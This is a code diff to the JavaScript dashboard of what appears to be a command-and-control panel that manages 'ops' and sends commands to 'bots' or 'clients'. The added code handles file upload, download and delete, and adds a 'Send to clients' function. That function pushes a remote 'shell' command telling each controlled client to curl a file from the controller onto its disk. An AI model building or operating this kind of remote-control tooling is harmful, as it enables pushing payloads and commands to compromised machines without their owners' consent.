@@ -134,6 +134,7 @@ function display_commands() {
     fetch_latest_command();
 }
 
+
 function display_files() {
     if (!current_op) {
         return;
@@ -150,16 +151,74 @@ function display_files() {
         var all_files = this.response['data']['files'];
         for (var i=0; i < all_files.length; i++) {
             if (all_files[i]['op_name'] == current_op) {
-                var new_el = document.createElement('li');
-                new_el.innerText = all_files[i]['filename'];
-                files_content_div.appendChild(new_el);
+                var file_container = document.createElement('div');
+                file_container.className = 'file-container';
+                var file_name = document.createElement('a');
+                file_name.innerText = all_files[i]['filename'];
+                file_name.className = 'file-name';
+                file_name.href = `${api_url}/files/download/${all_files[i]['guid']}`;
+                file_name.setAttribute('download', all_files[i]['filename']);
+
+                var file_delete_link = document.createElement('div');
+                file_delete_link.className = 'file-delete-button';
+                file_delete_link.setAttribute('guid', all_files[i]['guid']);
+                file_delete_link.innerText = 'Delete';
+                file_delete_link.addEventListener('click', send_file_delete_request);
+
+                var send_to_bots_link = document.createElement('div');
+                send_to_bots_link.className = 'file-send-button';
+                send_to_bots_link.setAttribute('guid', all_files[i]['guid']);
+                send_to_bots_link.setAttribute('filename', all_files[i]['filename']);
+                send_to_bots_link.innerText = 'Send to clients';
+                send_to_bots_link.addEventListener('click', send_to_clients_request);
+
+                file_container.appendChild(file_name);
+                file_container.appendChild(file_delete_link);
+                file_container.appendChild(send_to_bots_link);
+                files_content_div.appendChild(file_container);
             }
         }
     });
     req.open('GET', `${api_url}/files`);
     req.send();
-    // TODO: fetch files for current op.
+}
+
+function send_to_clients_request() {
+    // Information needed to downloading/saving file
+    var guid_to_send = this.getAttribute('guid');
+    var filename = this.getAttribute('filename');
+
+    var req = new XMLHttpRequest();
+    req.responseType = 'json';
     
+    req.addEventListener('load', function () {
+        console.log('Command sent.');
+    });
+    req.open('POST', `${api_url}/post`);
+
+    var data = {
+        'cmd_type': 'shell',
+        'cmd_data': `curl ${api_url}/files/${guid_to_send} > "/app/downloads/${filename}"`,
+        'op_name': current_op,
+    }
+    req.send(JSON.stringify(data));
+}
+
+function send_file_delete_request() {
+    var guid_to_delete = this.getAttribute('guid');
+    var req = new XMLHttpRequest();
+    req.responseType = 'json';
+    
+    req.addEventListener('load', function () {
+        console.log('File deleted.');
+        display_files();
+    });
+    req.open('POST', `${api_url}/files/delete`);
+
+    var data = {
+        'file': guid_to_delete,
+    }
+    req.send(JSON.stringify(data));
 }
 
 function hide_all_content() {
@@ -188,6 +247,31 @@ function bind_files_nav() {
     document.getElementById('files-nav').addEventListener('click', display_files);
 }
 
+function bind_upload_button() {
+    var upload_button = document.getElementById('file-upload-button');
+    upload_button.addEventListener('click', function() {
+        var file_input = document.getElementById('file-upload');
+        if (!file_input.files[0]) {
+            return;
+        }
+        var form_data = new FormData();
+        form_data.append('file', file_input.files[0]);
+        form_data.append('op_name', current_op);
+        
+        
+        var req = new XMLHttpRequest();
+        req.responseType = 'json';
+        
+        req.addEventListener('load', function () {
+            console.log('File uploaded.');
+            display_files();
+            file_input.value = null;
+        });
+        req.open('POST', `${api_url}/files/upload`);
+        req.send(form_data);
+    });
+}
+
 function init() {
     fetch_all_ops();
     detect_op_choice();
@@ -196,6 +280,7 @@ function init() {
     hide_all_content();
     bind_command_nav();
     bind_files_nav();
+    bind_upload_button();
 }
 
 window.onload = init;
